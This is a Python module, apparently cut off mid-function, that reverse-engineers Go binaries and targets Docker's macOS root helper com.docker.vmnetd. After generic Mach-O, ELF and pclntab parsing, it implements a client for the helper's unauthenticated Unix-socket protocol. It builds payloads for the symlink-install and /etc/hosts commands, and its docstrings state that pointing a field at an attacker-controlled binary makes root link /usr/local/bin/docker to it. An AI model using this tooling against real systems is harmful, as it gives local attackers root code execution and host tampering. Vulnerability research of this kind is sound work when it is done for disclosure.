"""
go_binary_re.py — Go binary reverse engineering module for ablation
Targets: Go 1.16/1.17+ Mach-O and ELF binaries (x86_64 / arm64)
Capabilities:
  - Mach-O / ELF section extraction
  - pclntab full function table parsing (Go 1.16/1.17/1.18/1.19/1.20+)
  - Capstone disassembly with RIP-relative pointer resolution
  - Command dispatch map reconstruction (mapassign_fast64 pattern)
  - Message frame format inference from bufio.Reader call chains
  - vmnetd-specific handler mapping and message body construction
  - go.string.* section extraction (hardcoded path strings)
  - Docker socket HTTP-over-unix client

Primary RE target: /path/to/target/com.docker.vmnetd

=== Go Binary Patterns (from book corpus) ===

Unix domain socket (Go):
  conn, _ := net.Dial("unix", "/var/run/foo.sock")     # client
  ln, _ := net.Listen("unix", "/var/run/foo.sock")     # server
  defer os.Remove(sockPath)                             # cleanup on exit
  Same interface as TCP: conn.Read/Write, net.Conn

Newline-framed protocol (vmnetd ReadString pattern):
  r := bufio.NewReader(conn)
  line, _ := r.ReadString('\\n')   # reads until '\\n', includes delimiter
  line = strings.TrimRight(line, "\\n")   # strip trailing newline
 : wire: each field = []byte(value) + []byte{'\\n'}

Exact-N-byte reads:
  io.ReadFull(conn, buf)   # errors if < len(buf) bytes available
  binary.Read(r, binary.LittleEndian, &val)   # typed read from io.Reader

Varint (Go binary.Uvarint):
  Each byte: low 7 bits = data, high bit = more bytes follow
  Encode: while n >= 0x80: out.append((n & 0x7f) | 0x80); n >>= 7; out.append(n)

Go register calling convention (1.17+, x86_64):
  AX=arg0, BX=arg1, CX=arg2, DI=arg3, SI=arg4, R8=arg5, R9=arg6

Go string header layout (64-bit):
  {data *byte [8], len int64 [8]} = 16 bytes at struct field offset

goroutine-per-connection server model:
  for { conn, _ := ln.Accept(); go handleConn(conn) }

launchd AF_UNIX socket activation:
  Sockets key in plist → launchd creates socket, passes fd → daemon calls
  syscall.Getenv("LISTEN_FDS") or net.FileListener(os.NewFile(fd, ""))

macOS SIP (Catalina):
  Protected: /usr/bin, /usr/sbin, /sbin, /bin, /System/*, /Library/Apple/*
  NOT protected: /usr/local/*, /Users/*, /var/*, /private/etc/* (by default)
  vmnetd writes to /usr/local/bin/ (not SIP-protected) and /var/run/

macOS Privileged Helper (vmnetd model):
  - Binary in /Library/PrivilegedHelperTools/<label>  (or installed by Docker)
  - LaunchDaemon plist in /Library/LaunchDaemons/<label>.plist
  - Runs as root, world-writable unix socket as IPC surface
  - No XPC: raw unix socket with custom binary framing (VMN3T protocol)
  - Authorization: none enforced on socket (any local process can connect)

Docker socket API (HTTP over unix):
  POST /v1.41/containers/{id}/exec  → {"Id": exec_id}
  POST /v1.41/exec/{exec_id}/start  → attach stdin/stdout
  GET  /v1.41/containers/json       → list containers
  Socket: /var/run/docker.sock (or /Users/groot/.docker/run/docker.sock on macOS)
"""

import struct
import os
import subprocess
from dataclasses import dataclass, field
from typing import Optional

try:
    import capstone
    HAVE_CAPSTONE = True
except ImportError:
    HAVE_CAPSTONE = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# pclntab magic values
PCLNTAB_MAGIC_116 = 0xfffffffa   # Go 1.16 / 1.17
PCLNTAB_MAGIC_118 = 0xfffffff0   # Go 1.18 / 1.19
PCLNTAB_MAGIC_120 = 0xfffffff1   # Go 1.20+ (added textStart field; functab entries 8B not 16B)
PCLNTAB_MAGIC_OLD = 0xfffffffb   # Go ≤ 1.15

# Mach-O load command types
LC_SEGMENT_64 = 0x19
LC_UUID       = 0x1b

# ELF machine types
EM_X86_64 = 0x3e
EM_AARCH64 = 0xb7

TEXT_SLIDE_DEFAULT = 0x4000000  # macOS PIE slide for vmnetd

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class Section:
    name: str
    fileoff: int
    size: int
    va: int      # linked VA (without ASLR slide)

@dataclass
class GoFunc:
    va: int          # entry VA (linked, no slide)
    fileoff: int     # entry file offset
    name: str
    nameoff: int     # raw offset into funcnametab

@dataclass
class HandlerEntry:
    cmd_id: int
    func_va: int
    func_name: str
    args_hint: str = ""

@dataclass
class AnalysisResult:
    binary_path: str
    go_version: str = ""
    arch: str = ""
    pclntab_magic: int = 0
    num_functions: int = 0
    functions: list = field(default_factory=list)     # list[GoFunc]
    handlers: list = field(default_factory=list)      # list[HandlerEntry]
    message_frames: dict = field(default_factory=dict) # func_name -> frame_info
    errors: list = field(default_factory=list)

# ---------------------------------------------------------------------------
# Binary loading helpers
# ---------------------------------------------------------------------------

def load_binary(path: str) -> bytes:
    with open(path, "rb") as f:
        return f.read()

def is_macho(data: bytes) -> bool:
    return data[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
                         b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe')

def is_elf(data: bytes) -> bool:
    return data[:4] == b'\x7fELF'

# ---------------------------------------------------------------------------
# Mach-O parser
# ---------------------------------------------------------------------------

def parse_macho_sections(data: bytes, text_slide: int = TEXT_SLIDE_DEFAULT) -> dict:
    """Return dict mapping section name -> Section. Handles 64-bit LE Mach-O."""
    sections = {}
    magic = struct.unpack_from('<I', data, 0)[0]
    if magic == 0xfeedface:  # 32-bit LE
        raise ValueError("32-bit Mach-O not supported")
    if magic not in (0xfeedfacf, 0xcffaedfe):
        raise ValueError(f"Not a valid Mach-O: magic=0x{magic:08x}")

    le = (magic == 0xfeedfacf)
    endian = '<' if le else '>'

    # mach_header_64: magic(4)+cputype(4)+cpusubtype(4)+filetype(4)+ncmds(4)+sizeofcmds(4)+flags(4)+reserved(4)
    ncmds = struct.unpack_from(f'{endian}I', data, 16)[0]
    hdr_size = 32
    off = hdr_size

    for _ in range(ncmds):
        cmd, cmdsize = struct.unpack_from(f'{endian}II', data, off)
        if cmd == LC_SEGMENT_64:
            # segment_command_64: cmd(4)+size(4)+segname(16)+vmaddr(8)+vmsize(8)+
            #   fileoff(8)+filesize(8)+maxprot(4)+initprot(4)+nsects(4)+flags(4) = 72 bytes
            seg_name = data[off+8:off+24].rstrip(b'\x00').decode('ascii', errors='replace')
            nsects = struct.unpack_from(f'{endian}I', data, off + 64)[0]
            sect_off = off + 72
            for _ in range(nsects):
                # section_64: sectname(16)+segname(16)+addr(8)+size(8)+offset(4)+
                #   align(4)+reloff(4)+nreloc(4)+flags(4)+reserved1(4)+reserved2(4)+reserved3(4)=80 bytes
                sect_name = data[sect_off:sect_off+16].rstrip(b'\x00').decode('ascii', errors='replace')
                va      = struct.unpack_from(f'{endian}Q', data, sect_off + 32)[0]
                size    = struct.unpack_from(f'{endian}Q', data, sect_off + 40)[0]
                fileoff = struct.unpack_from(f'{endian}I', data, sect_off + 48)[0]
                full_name = f"__{sect_name}" if not sect_name.startswith('__') else sect_name
                sections[full_name] = Section(
                    name=full_name,
                    fileoff=fileoff,
                    size=size,
                    va=va,
                )
                sect_off += 80
        off += cmdsize
    return sections

# ---------------------------------------------------------------------------
# ELF parser (minimal — sections only)
# ---------------------------------------------------------------------------

def parse_elf_sections(data: bytes) -> dict:
    """Return dict mapping section name -> Section for 64-bit LE ELF."""
    sections = {}
    ei_class = data[4]
    if ei_class != 2:
        raise ValueError("Only ELF64 supported")
    ei_data = data[5]
    endian = '<' if ei_data == 1 else '>'

    e_shoff   = struct.unpack_from(f'{endian}Q', data, 40)[0]
    e_shentsize = struct.unpack_from(f'{endian}H', data, 58)[0]
    e_shnum   = struct.unpack_from(f'{endian}H', data, 60)[0]
    e_shstrndx = struct.unpack_from(f'{endian}H', data, 62)[0]

    # String table section
    shstr_hdr = e_shoff + e_shstrndx * e_shentsize
    shstr_off = struct.unpack_from(f'{endian}Q', data, shstr_hdr + 24)[0]

    for i in range(e_shnum):
        sh = e_shoff + i * e_shentsize
        sh_name  = struct.unpack_from(f'{endian}I', data, sh)[0]
        sh_addr  = struct.unpack_from(f'{endian}Q', data, sh + 16)[0]
        sh_offset= struct.unpack_from(f'{endian}Q', data, sh + 24)[0]
        sh_size  = struct.unpack_from(f'{endian}Q', data, sh + 32)[0]
        name_off = shstr_off + sh_name
        null = data.find(b'\x00', name_off)
        name = data[name_off:null].decode('ascii', errors='replace')
        if name:
            sections[name] = Section(name=name, fileoff=sh_offset, size=sh_size, va=sh_addr)
    return sections

# ---------------------------------------------------------------------------
# pclntab parser — Go 1.16 / 1.17
# ---------------------------------------------------------------------------

def _decode_pclntab_116(data: bytes, pclntab_data: bytes) -> tuple:
    """
    Parse Go 1.16/1.17 pclntab. Returns (nfunc, funcnametab_offset, functab_offset, pcln_offset_field).

    pcHeader layout (Go 1.16 / 1.17, 64-bit):
      uint32 magic         [0:4]    = 0xfffffffa
      uint8  pad1, pad2    [4:6]    = 0
      uint8  minLC         [6]
      uint8  ptrSize       [7]      = 8 (64-bit)
      int    nfunc         [8:16]   = int64 on 64-bit host
      uint   nfiles        [16:24]  = uint64
      uintptr funcnameOffset [24:32]
      uintptr cuOffset       [32:40]
      uintptr filetabOffset  [40:48]
      uintptr pctabOffset    [48:56]
      uintptr pclnOffset     [56:64]  ← offset from pcHeader start to functab data
    Total: 64 bytes
    """
    if len(pclntab_data) < 64:
        raise ValueError("pclntab too small")

    magic     = struct.unpack_from('<I', pclntab_data, 0)[0]
    nfunc     = struct.unpack_from('<q', pclntab_data, 8)[0]
    _nfiles   = struct.unpack_from('<Q', pclntab_data, 16)[0]
    funcname_off = struct.unpack_from('<Q', pclntab_data, 24)[0]
    _cu_off      = struct.unpack_from('<Q', pclntab_data, 32)[0]
    _filetab_off = struct.unpack_from('<Q', pclntab_data, 40)[0]
    _pctab_off   = struct.unpack_from('<Q', pclntab_data, 48)[0]
    pcln_off     = struct.unpack_from('<Q', pclntab_data, 56)[0]

    return nfunc, funcname_off, pcln_off

def _decode_pclntab_118(data: bytes, pclntab_data: bytes) -> tuple:
    """
    Go 1.18/1.19 pclntab. Same field layout as 1.16/1.17 for our purposes.
    """
    return _decode_pclntab_116(data, pclntab_data)

def _decode_pclntab_120(pclntab_data: bytes) -> tuple:
    """
    Go 1.20+ pclntab (magic 0xfffffff1).

    pcHeader layout (Go 1.20+, 64-bit):
      uint32 magic         [0:4]    = 0xfffffff1
      uint8  pad1, pad2    [4:6]    = 0
      uint8  minLC         [6]
      uint8  ptrSize       [7]      = 8 (64-bit)
      int    nfunc         [8:16]
      uint   nfiles        [16:24]
      uintptr textStart    [24:32]  ← NEW vs 1.18; func PCs are offsets from here
      uintptr funcnameOffset [32:40]
      uintptr cuOffset       [40:48]
      uintptr filetabOffset  [48:56]
      uintptr pctabOffset    [56:64]
      uintptr pclnOffset     [64:72]  ← functab start
    Total: 72 bytes

    Functab entries changed from 16B (two uint64) to 8B (two uint32):
      uint32 pc_offset   (offset from textStart)
      uint32 funcoff     (offset within pclntab, relative to pcln_off)

    _Func struct: entryOff(uint32) at +0, nameOff(int32) at +4
    """
    if len(pclntab_data) < 72:
        raise ValueError("pclntab too small for Go 1.20 header")

    nfunc        = struct.unpack_from('<q', pclntab_data, 8)[0]
    text_start   = struct.unpack_from('<Q', pclntab_data, 24)[0]
    funcname_off = struct.unpack_from('<Q', pclntab_data, 32)[0]
    pcln_off     = struct.unpack_from('<Q', pclntab_data, 64)[0]

    return nfunc, funcname_off, pcln_off, text_start

def parse_pclntab(binary_data: bytes, pclntab_fileoff: int, pclntab_size: int,
                   text_slide: int = TEXT_SLIDE_DEFAULT) -> list:
    """
    Parse Go pclntab and return list[GoFunc].
    Supports: Go ≤ 1.17 (0xfffffffa), 1.18/1.19 (0xfffffff0), 1.20+ (0xfffffff1).
    """
    pclntab = binary_data[pclntab_fileoff: pclntab_fileoff + pclntab_size]
    if len(pclntab) < 8:
        raise ValueError("pclntab section too small")

    magic = struct.unpack_from('<I', pclntab, 0)[0]

    if magic == PCLNTAB_MAGIC_120:
        # Go 1.20+: 8-byte functab entries, textStart field, nameOff at +4 in _Func
        nfunc, funcname_off, pcln_off, text_start = _decode_pclntab_120(pclntab)
        funcnametab = pclntab[funcname_off:]
        funcs = []
        for i in range(nfunc):
            entry_off = pcln_off + i * 8
            if entry_off + 8 > len(pclntab):
                break
            pc_offset = struct.unpack_from('<I', pclntab, entry_off)[0]
            funcoff   = struct.unpack_from('<I', pclntab, entry_off + 4)[0]
            entry_va  = text_start + pc_offset
            abs_fo    = pcln_off + funcoff
            if abs_fo + 8 > len(pclntab):
                continue
            nameoff = struct.unpack_from('<i', pclntab, abs_fo + 4)[0]
            if nameoff < 0 or nameoff >= len(funcnametab):
                continue
            null = funcnametab.find(b'\x00', nameoff)
            if null < 0:
                continue
            name = funcnametab[nameoff:null].decode('utf-8', errors='replace')
            if not name:
                continue
            fileoff = entry_va - text_slide if entry_va > text_slide else 0
            funcs.append(GoFunc(va=entry_va, fileoff=fileoff, name=name, nameoff=nameoff))
        return funcs

    # Legacy path: Go 1.16–1.19, 16-byte functab entries
    if magic == PCLNTAB_MAGIC_116:
        nfunc, funcname_off, pcln_off = _decode_pclntab_116(binary_data, pclntab)
    elif magic == PCLNTAB_MAGIC_118:
        nfunc, funcname_off, pcln_off = _decode_pclntab_118(binary_data, pclntab)
    elif magic == PCLNTAB_MAGIC_OLD:
        raise ValueError("Go ≤ 1.15 pclntab not implemented")
    else:
        raise ValueError(f"Unknown pclntab magic: 0x{magic:08x}")

    funcnametab = pclntab[funcname_off:]
    funcs = []

    for i in range(nfunc):
        entry_off = pcln_off + i * 16   # 16-byte entries: {entry_pc uint64, funcoff uint64}
        if entry_off + 16 > len(pclntab):
            break

        entry_pc  = struct.unpack_from('<Q', pclntab, entry_off)[0]
        funcoff   = struct.unpack_from('<Q', pclntab, entry_off + 8)[0]

        abs_funcoff = pcln_off + funcoff
        if abs_funcoff + 12 > len(pclntab):
            continue

        # _Func struct: entry_pc(8) | nameoff(int32) at +8
        nameoff = struct.unpack_from('<i', pclntab, abs_funcoff + 8)[0]
        if nameoff < 0 or nameoff >= len(funcnametab):
            continue

        null = funcnametab.find(b'\x00', nameoff)
        if null < 0:
            continue
        name = funcnametab[nameoff:null].decode('utf-8', errors='replace')
        if not name:
            continue

        fileoff = entry_pc - text_slide if entry_pc > text_slide else 0

        funcs.append(GoFunc(
            va=entry_pc,
            fileoff=fileoff,
            name=name,
            nameoff=nameoff,
        ))

    return funcs

# ---------------------------------------------------------------------------
# Go version detection from binary
# ---------------------------------------------------------------------------

def detect_go_version(binary_data: bytes) -> str:
    """Extract Go version string embedded in the binary (go buildinfo)."""
    # Go embeds "go1.XX.Y" in the binary
    idx = binary_data.find(b'\xff Go buildinf:')
    if idx < 0:
        idx = binary_data.find(b'go1.')
        if idx < 0:
            return "unknown"
    chunk = binary_data[idx:idx+64]
    ver_start = chunk.find(b'go1.')
    if ver_start < 0:
        return "unknown"
    ver_end = ver_start
    while ver_end < len(chunk) and (chunk[ver_end:ver_end+1].isalpha() or
                                      chunk[ver_end:ver_end+1].isdigit() or
                                      chunk[ver_end:ver_end+1] == b'.'):
        ver_end += 1
    return chunk[ver_start:ver_end].decode('ascii', errors='replace')

# ---------------------------------------------------------------------------
# Capstone disassembly helpers
# ---------------------------------------------------------------------------

def disasm_function(binary_data: bytes, func_fileoff: int, func_size: int,
                     func_va: int, arch: str = "x86_64",
                     max_bytes: int = 0x2000) -> list:
    """
    Disassemble a function. Returns list of capstone instructions.
    arch: "x86_64" or "arm64"
    """
    if not HAVE_CAPSTONE:
        return []

    size = min(func_size if func_size else max_bytes, max_bytes)
    code = binary_data[func_fileoff: func_fileoff + size]
    if not code:
        return []

    if arch == "x86_64":
        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    elif arch == "arm64":
        cs = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM)
    else:
        return []

    cs.detail = True
    instrs = list(cs.disasm(code, func_va))
    return instrs

def resolve_rip_ref(instr, base_va: int = TEXT_SLIDE_DEFAULT) -> Optional[int]:
    """
    For x86_64 RIP-relative instructions (MOV/LEA with [RIP+disp]),
    return the target VA.
    """
    if not HAVE_CAPSTONE:
        return None
    import capstone.x86 as x86
    for op in instr.operands:
        if op.type == x86.X86_OP_MEM and op.mem.base == x86.X86_REG_RIP:
            # target = next instruction VA + disp
            next_va = instr.address + instr.size
            return next_va + op.mem.disp
    return None

def find_func_size(func_va: int, functions: list) -> int:
    """Estimate function size as gap to next function."""
    sorted_funcs = sorted(functions, key=lambda f: f.va)
    for i, f in enumerate(sorted_funcs):
        if f.va == func_va and i + 1 < len(sorted_funcs):
            return sorted_funcs[i+1].va - func_va
    return 0x400   # default guess

# ---------------------------------------------------------------------------
# Command dispatch map reconstruction
# ---------------------------------------------------------------------------

def find_mapassign_pattern(binary_data: bytes, funcs: list,
                            text_slide: int = TEXT_SLIDE_DEFAULT) -> list:
    """
    Find the handler registration loop in vmnetd-style Go binaries.
    Pattern: MOVQ <cmd_id>, R?   // ecx = cmd ID (uint64)
             CALL runtime.mapassign_fast64
             MOVQ <handler_ptr>, [rax]  // store handler func ptr

    Returns list[HandlerEntry].
    """
    if not HAVE_CAPSTONE:
        return []

    import capstone.x86 as x86

    # Build VA->name lookup from pclntab
    va_to_name = {f.va: f.name for f in funcs}

    # Find mapassign_fast64 VA
    mapassign_va = None
    for f in funcs:
        if 'mapassign_fast64' in f.name and 'runtime' in f.name:
            mapassign_va = f.va
            break

    handlers = []
    init_funcs = [f for f in funcs if f.name.endswith('.init') or
                   'initHandlers' in f.name or 'registerHandler' in f.name or
                   'NewHandle' in f.name or 'Handle' in f.name.split('.')[-1]]

    for fn in init_funcs:
        fsize = find_func_size(fn.va, funcs)
        instrs = disasm_function(binary_data, fn.fileoff, fsize, fn.va)
        if not instrs:
            continue

        # Slide through instructions looking for the pattern:
        # MOV imm -> reg (cmd ID), then CALL mapassign_fast64, then MOV fptr -> mem
        cmd_id = None
        for j, ins in enumerate(instrs):
            # Look for: MOV $imm, reg (cmd ID load)
            if ins.mnemonic == 'mov' and ins.operands:
                dst, src = ins.operands[0], ins.operands[1]
                if src.type == x86.X86_OP_IMM and 0 <= src.imm <= 255:
                    # Candidate cmd ID in range 0-255
                    # Check if next few instructions include a CALL to mapassign
                    for k in range(j+1, min(j+8, len(instrs))):
                        ki = instrs[k]
                        if ki.mnemonic == 'call':
                            call_target = ki.operands[0].imm if ki.operands[0].type == x86.X86_OP_IMM else 0
                            if call_target == mapassign_va:
                                cmd_id = src.imm
                            elif call_target and call_target in va_to_name:
                                if 'mapassign' in va_to_name[call_target]:
                                    cmd_id = src.imm

            # After finding cmd_id, look for handler function pointer store
            if cmd_id is not None and ins.mnemonic == 'mov' and ins.operands:
                src = ins.operands[-1]
                if src.type == x86.X86_OP_IMM and src.imm > text_slide:
                    handler_va = src.imm
                    handler_name = va_to_name.get(handler_va, f"func_{handler_va:x}")
                    handlers.append(HandlerEntry(
                        cmd_id=cmd_id,
                        func_va=handler_va,
                        func_name=handler_name,
                    ))
                    cmd_id = None

    return handlers

# ---------------------------------------------------------------------------
# Rodata function pointer table scan
# ---------------------------------------------------------------------------

def scan_rodata_fptrs(binary_data: bytes, sections: dict, funcs: list,
                       text_slide: int = TEXT_SLIDE_DEFAULT) -> list:
    """
    Go stores function pointer tables in __rodata (or .rodata).
    Each 8-byte word that aligns to a known function VA is a candidate fptr.
    Returns list of (va, name) for rodata-stored function pointers.
    """
    rodata_sec = sections.get('__rodata') or sections.get('.rodata')
    if not rodata_sec:
        return []

    va_set = {f.va: f.name for f in funcs}
    rodata = binary_data[rodata_sec.fileoff: rodata_sec.fileoff + rodata_sec.size]
    results = []
    for i in range(0, len(rodata) - 7, 8):
        word = struct.unpack_from('<Q', rodata, i)[0]
        if word in va_set:
            abs_va = rodata_sec.va + i
            results.append((abs_va, va_set[word], word))
    return results

# ---------------------------------------------------------------------------
# Message frame inference (vmnetd handleInstallSymlinks)
# ---------------------------------------------------------------------------

def infer_message_frames(binary_data: bytes, func_va: int, funcs: list,
                          text_slide: int = TEXT_SLIDE_DEFAULT,
                          arch: str = "x86_64") -> dict:
    """
    Disassemble a frame-reading function and infer:
    - frame size (look for 0x400, 0x200, etc. constants)
    - field offsets (string header reads: 2 x 8-byte words = data ptr + len)
    - read patterns (bufio.Reader.ReadFull call sites)
    Returns dict with frame analysis data.
    """
    if not HAVE_CAPSTONE:
        return {"error": "capstone not available"}

    import capstone.x86 as x86

    va_to_name = {f.va: f.name for f in funcs}
    fn_data = [f for f in funcs if f.va == func_va]
    if not fn_data:
        return {"error": f"function VA 0x{func_va:x} not in pclntab"}

    fn = fn_data[0]
    fsize = find_func_size(func_va, funcs)
    instrs = disasm_function(binary_data, fn.fileoff, fsize, func_va, arch)

    frame_sizes = set()
    string_offsets = []
    read_calls = []
    calls_to = []

    for j, ins in enumerate(instrs):
        # Frame size: look for MOV/CMP imm == 0x400 (1024-byte frame)
        if ins.mnemonic in ('mov', 'cmp', 'add') and ins.operands:
            for op in ins.operands:
                if op.type == x86.X86_OP_IMM and op.imm in (0x100, 0x200, 0x400, 0x800, 0x1000):
                    frame_sizes.add(op.imm)

        # Call sites — identify bufio.Reader.Read, ReadFull, etc.
        if ins.mnemonic == 'call' and ins.operands:
            tgt = ins.operands[0].imm if ins.operands[0].type == x86.X86_OP_IMM else 0
            if tgt:
                calls_to.append(tgt)
                name = va_to_name.get(tgt, f"0x{tgt:x}")
                if any(x in name for x in ('Read', 'bufio', 'read', 'Decode', 'Unmarshal')):
                    read_calls.append({'va': tgt, 'name': name, 'at': f"0x{ins.address:x}"})

        # String slice reads: look for MOV [rax+N], reg where N is 0x20, 0x28, 0x30...
        if ins.mnemonic in ('mov', 'lea') and ins.operands:
            for op in ins.operands:
                if op.type == x86.X86_OP_MEM and op.mem.disp in (0x20, 0x28, 0x30, 0x38, 0x40, 0x48):
                    string_offsets.append(op.mem.disp)

    # Resolve callee names
    callee_names = [(va, va_to_name.get(va, f"0x{va:x}")) for va in set(calls_to)]

    return {
        "func_va": f"0x{func_va:x}",
        "func_name": fn.name,
        "disasm_len": len(instrs),
        "frame_sizes": sorted(frame_sizes),
        "string_field_offsets": sorted(set(string_offsets)),
        "read_calls": read_calls,
        "all_callees": [(f"0x{va:x}", name) for va, name in sorted(callee_names)],
    }

# ---------------------------------------------------------------------------
# vmnetd-specific: message body builder
# ---------------------------------------------------------------------------

def encode_varint(n: int) -> bytes:
    """Go binary.Uvarint encoding."""
    buf = []
    while n >= 0x80:
        buf.append((n & 0x7f) | 0x80)
        n >>= 7
    buf.append(n & 0x7f)
    return bytes(buf)

def build_vmnetd_handshake() -> bytes:
    """
    VMN3T handshake client→server:
    [5 non-VMN3T bytes][4-byte varint(22)][40 bytes padding]
    Server responds: b'VMN3T' + varint + 40-byte challenge
    Client then sends 1 byte: cmd_type
    """
    prefix = b"\x00\x00\x00\x00\x00"          # 5 bytes, not "VMNET"
    version = encode_varint(22).ljust(4, b"\x00")[:4]
    padding = b"\x41" * 40
    return prefix + version + padding

def build_symlink_message(fields: list) -> bytes:
    """
    Build a vmnetd newline-framed message body.
    vmnetd protocol.ReadString reads each field as: bytes until '\\n', strips trailing '\\n'.
    Wire format: field0\\nfield1\\nfield2\\n...fieldN\\n

    Args:
        fields: list of str, one per protocol.ReadString call in the handler
    Returns:
        bytes: raw payload to send after the command byte
    """
    return b"".join(f.encode("utf-8") + b"\n" for f in fields)


def build_vmnetd_install_symlinks_msg(
    field0: str = "",
    field1: str = "",
    field2: str = "",
    field3: str = "",
    field4: str = "",
    field5: str = "",
) -> bytes:
    """
    Construct the payload for vmnetd handleInstallSymlinks (cmd=7).

    Wire format: 6 sequential newline-terminated strings read via protocol.ReadString(conn, 1024).
    Confirmed from commands.init + handleInstallSymlinks disassembly.

    Field→struct mapping (SymlinkMessage, confirmed offsets):
      field0: SymlinkMessage.field0  (struct offset 0x00) — install base path / app bundle
      field1: SymlinkMessage.field1  (struct offset 0x10) — docker binary source dir
      field2: SymlinkMessage.field2  (struct offset 0x20) — cli-plugins source dir
      field3: SymlinkMessage.field3  (struct offset 0x30) — docker socket source path
      field4: SymlinkMessage.field4  (struct offset 0x40) — docker-cli socket source path
      field5: SymlinkMessage.field5  (struct offset 0x50) — version string / label

    doSymlink behavior for each pair:
      dst = hardcoded (VMNETD_SYMLINK_HARDCODED_DSTS)
      src = field value (user-controlled)
      gate: os.Stat(src) must succeed; file must EXIST at src before symlink created

    Attack surface: set field1 = path containing malicious docker binary;
    vmnetd creates /usr/local/bin/docker -> attacker-controlled binary (as root).
    Requires: src path exists on filesystem before sending cmd.
    """
    return build_symlink_message([field0, field1, field2, field3, field4, field5])

def vmnetd_drain_challenge(s, timeout: float = 2.0) -> bytes:
    """
    Drain the full VMN3T server challenge response.
    Structure: b'VMN3T' (5) + varint (1-2 bytes) + 40-byte challenge = ~47 bytes total.
    Must be fully consumed before sending the command byte.
    """
    import socket as sock_mod
    buf = b""
    s.settimeout(timeout)
    try:
        # Read until we have at least 47 bytes (5 magic + 2 varint + 40 challenge)
        while len(buf) < 47:
            chunk = s.recv(128)
            if not chunk:
                break
            buf += chunk
            if len(buf) >= 5 and not buf.startswith(b'VMN3T'):
                break  # unexpected magic, stop
    except Exception:
        pass
    return buf


def vmnetd_send_cmd(sock_path: str, cmd_type: int,
                     payload: bytes = b"", timeout: float = 5.0) -> bytes:
    """
    Send a command to vmnetd via Unix socket and return raw response.
    Protocol:
      client → handshake (49 bytes: 5 null + 4-byte varint(22) + 40 padding)
      server → VMN3T + varint + 40-byte challenge (~47 bytes)  ← MUST drain fully
      client → [1 byte cmd_type] [newline-framed payload if any]
      server → response (cmd=9 ping returns b'\\x00')
    """
    import socket as sock_mod
    s = sock_mod.socket(sock_mod.AF_UNIX, sock_mod.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(sock_path)
        s.sendall(build_vmnetd_handshake())
        vmnetd_drain_challenge(s, timeout=min(timeout, 3.0))
        s.sendall(bytes([cmd_type]) + payload)
        result = b""
        s.settimeout(timeout)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                result += chunk
        except Exception:
            pass
        return result
    finally:
        s.close()


def build_add_extra_hosts_msg(hostname: str, ip: str) -> bytes:
    """
    Build payload for vmnetd cmd=12 (handleAddExtraHosts).
    Writes entries to /etc/hosts as root via newline-framed protocol.
    Wire format: same newline-terminated string protocol.
    Fields (inferred from handleAddExtraHosts disassembly):
      field0: hostname to add
      field1: IP address string
    """
    return build_symlink_message([hostname, ip])

# ---------------------------------------------------------------------------
# SymlinkMessage field metadata
# ---------------------------------------------------------------------------

@dataclass
class SymlinkMessageFields:
    """
    Confirmed field layout for vmnetd handleInstallSymlinks (cmd=7).
    Each field is read sequentially via protocol.ReadString(conn, 1024),
    which reads until '\\n' and strips the trailing newline character.
    Mapping confirmed from handleInstallSymlinks + doSymlink disassembly.
    """
    field0: str = ""   # struct offset 0x00 — app bundle / install base path
    field1: str = ""   # struct offset 0x10 — docker binary source dir (→ /usr/local/bin/)
    field2: str = ""   # struct offset 0x20 — cli-plugins source dir (→ /usr/local/lib/docker/cli-plugins)
    field3: str = ""   # struct offset 0x30 — docker.sock source path (→ /var/run/docker.sock)
    field4: str = ""   # struct offset 0x40 — docker-cli.sock source path (→ /var/run/docker-cli.sock)
    field5: str = ""   # struct offset 0x50 — version / label string

    def to_payload(self) -> bytes:
        return build_vmnetd_install_symlinks_msg(
            self.field0, self.field1, self.field2,
            self.field3, self.field4, self.field5,
        )


def doSymlink_path_analysis() -> dict:
    """
    Returns confirmed src→dst mapping for all doSymlink calls in vmnetd.
    dst: hardcoded string from go.string.* section
    src: SymlinkMessageFields field (user-controlled if that field is set)
    gate: os.Stat(src) must succeed before os.Symlink(src, dst) is called
    """
    return {
        "docker_binary": {
            "src_field": "field1",
            "dst": "/usr/local/bin/docker",  # and other binaries via Sprintf
            "user_controlled_src": True,
            "stat_gate": True,
            "note": "field1 must point to EXISTING docker binary; vmnetd creates /usr/local/bin/docker -> field1/docker",
        },
        "cli_plugins_dir": {
            "src_field": "field2",
            "dst": "/usr/local/lib/docker/cli-plugins",
            "user_controlled_src": True,
            "stat_gate": True,
            "note": "symlinks each .so / binary in field2/ into /usr/local/lib/docker/cli-plugins/",
        },
        "docker_sock": {
            "src_field": "field3",
            "dst": "/var/run/docker.sock",
            "user_controlled_src": True,
            "stat_gate": True,
            "note": "field3 path must exist; creates /var/run/docker.sock -> field3",
        },
        "docker_cli_sock": {
            "src_field": "field4",
            "dst": "/var/run/docker-cli.sock",
            "user_controlled_src": True,
            "stat_gate": True,
        },
    }


# ---------------------------------------------------------------------------
# go.string.* section extraction
# ---------------------------------------------------------------------------

def analyze_go_string_section(binary_path: str,
                               section_fileoff: int = 0x149be0,
                               section_size: int = 0x40000,
                               min_len: int = 4,
                               max_len: int = 512) -> list:
    """
    Extract printable strings from the go.string.* section.
    Go stores all string literals as a packed blob; individual strings are
    referenced by pointer+length pairs in the binary (not null-terminated).
    This extracts all printable runs >= min_len bytes.

    Args:
        binary_path: path to the binary
        section_fileoff: file offset of go.string.* section (default: vmnetd 0x149be0)
        section_size: bytes to scan (default 256KB from base)
        min_len: minimum printable run length to emit
        max_len: maximum string length to emit
    Returns:
        list of (fileoff, string) tuples for each printable run
    """
    data = load_binary(binary_path)
    blob = data[section_fileoff: section_fileoff + section_size]
    results = []
    i = 0
    while i < len(blob):
        # Find a run of printable ASCII (0x20-0x7e) or common control chars
        start = i
        while i < len(blob) and (0x20 <= blob[i] <= 0x7e or blob[i] in (0x09, 0x0a, 0x0d)):
            i += 1
        run_len = i - start
        if min_len <= run_len <= max_len:
            s = blob[start:i].decode('ascii', errors='replace')
            results.append((section_fileoff + start, s))
        else:
            i += 1
    return results


def find_vmnetd_paths(binary_path: str) -> list:
    """
    Extract path strings from vmnetd go.string.* section.
